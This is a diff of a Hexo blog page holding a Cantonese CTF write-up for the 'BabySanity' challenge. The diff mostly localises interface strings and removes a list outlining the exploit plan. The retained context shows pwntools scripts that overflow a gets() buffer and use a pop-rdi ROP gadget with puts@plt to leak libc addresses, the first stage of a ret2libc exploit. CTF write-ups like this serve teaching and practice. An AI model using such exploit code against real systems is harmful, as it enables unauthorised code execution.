@@ -13,7 +13,7 @@
 <meta property="og:url" content="https://catpawn.github.io/2018/05/12/VxCTF2018-BabySanity/index.html">
 <meta property="og:site_name" content="CatPawn">
 <meta property="og:description" content="QuestionBinarysanitylibc-2.23.so Solution一見到有個.so 比賽果陣都放棄左了 , 呢題係完左之後2日先做番出黎 首先啦 , 基本動作 checksec先12345Arch:    amd64-64-littleRELRO:   Partial RELROStack:   No canary foundNX:      NX enabledPIE:">
-<meta property="og:updated_time" content="2018-05-11T18:13:48.227Z">
+<meta property="og:updated_time" content="2018-05-11T18:16:02.898Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="VxCTF2018-BabySanity">
 <meta name="twitter:description" content="QuestionBinarysanitylibc-2.23.so Solution一見到有個.so 比賽果陣都放棄左了 , 呢題係完左之後2日先做番出黎 首先啦 , 基本動作 checksec先12345Arch:    amd64-64-littleRELRO:   Partial RELROStack:   No canary foundNX:      NX enabledPIE:">
@@ -52,9 +52,9 @@
       </nav>
       <nav id="sub-nav">
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Suche"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Buscar"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://catpawn.github.io"></form>
@@ -89,15 +89,6 @@
 <h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>一見到有個.so 比賽果陣都放棄左了 , 呢題係完左之後2日先做番出黎</p>
 <p>首先啦 , 基本動作 checksec先<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:    amd64-64-little</span><br><span class="line">RELRO:   Partial RELRO</span><br><span class="line">Stack:   No canary found</span><br><span class="line">NX:      NX enabled</span><br><span class="line">PIE:     No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
 <p>之後扔入IDA睇下個Main先<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [sp+10h] [bp-70h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Sanity Check should be easy"</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>睇落好似無乜野好簡單咁 , 但係其實都真係幾難<br>首先啦佢開左ALSR , 所以每次加載個.so入黎果時個base address都唔同<br>所以要做以下既步驟</p>
-<ol>
-<li>leak 是但一個 libc function既address出黎</li>
-<li>拎番 libc 果個function既offset , 再將 offset減leaked function address 就有個 libc base address , 所拎到之後只需要係libc到拎function , 再加番 libc base address , 就可以係ASLR既環境下做到function call.</li>
-<li>拎番 libc system個offset , 同埋 /bin/sh呢條string既offset</li>
-<li>搵v4 overflow果個offset , 就咁睇應該係0x70 , 而要+8係因為x64 , 每個地址係8bytes長</li>
-<li>順序將 got , plt 既puts 壓番入main , 咁就會行多次Main , 行plt既puts print 番 got既puts address出黎</li>
-<li>然後就可以構做多次buffer overflow , 再做番ROP.</li>
-</ol>
 <h3 id="Leak-Function-Address"><a href="#Leak-Function-Address" class="headerlink" title="Leak Function Address"></a>Leak Function Address</h3><p>首先試下點樣可以 trigger main行多次先<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'sanity'</span>)</span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(<span class="number">0x401000</span>) <span class="comment">#just for fill rdi</span></span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">Sanity Check should be easy</span></span><br><span class="line"><span class="string">Sanity Check should be easy</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p>
 <p>可以見到已經行左2次 , 咁如果我地將0x401000轉做一個function既地址會點?<br>最終係可以構做到變成puts(gotAddress)<br>例如想leak libc既main 可以<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'sanity'</span>)</span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">gadget = <span class="number">0x4006a3</span> <span class="comment">#pop rdi;ret;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(e.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'puts'</span>]) <span class="comment">#puts(__libc_start_main_got)</span></span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">有堆亂碼 , 應該係address既hex string黎</span></span><br><span class="line"><span class="string">Sanity Check should be easy</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p>
 <p>咁我地試下leak puts既address啦 , 搵offset都方便d<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'sanity'</span>)</span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">gadget = <span class="number">0x4006a3</span> <span class="comment">#pop rdi;ret;</span></span><br><span class="line">libc_puts_off = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(e.got[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'puts'</span>]) <span class="comment">#puts(puts_addr_got)</span></span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"easy\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">leaked = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> leaked.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">90afab45ad7f0a</span></span><br><span class="line"><span class="string">Sanity Check should be easy</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p>
@@ -118,7 +109,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://catpawn.github.io/2018/05/12/VxCTF2018-BabySanity/" data-id="cjh2a68h6000irsw5ca41qqlu" class="article-share-link">Teilen</a>
+      <a data-url="https://catpawn.github.io/2018/05/12/VxCTF2018-BabySanity/" data-id="cjh2a68h6000irsw5ca41qqlu" class="article-share-link">Compartir</a>
       
       
     </footer>
@@ -129,7 +120,7 @@
   
   
     <a href="/2018/05/01/ASISCTF2018-LeftOrRight/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Älter</strong>
+      <strong class="article-nav-caption">Viejo</strong>
       <div class="article-nav-title">ASISCTF2018-LeftOrRight</div>
     </a>
   
@@ -152,7 +143,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Archiv</h3>
+    <h3 class="widget-title">Archivos</h3>
     <div class="widget">
       <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li></ul>
     </div>
@@ -162,7 +153,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">letzter Beitrag</h3>
+    <h3 class="widget-title">Posts recientes</h3>
     <div class="widget">
       <ul>
         
@@ -199,7 +190,7 @@
   <div class="outer">
     <div id="footer-info" class="inner">
       &copy; 2018 CatPawn<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      Construido por <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
 </footer>
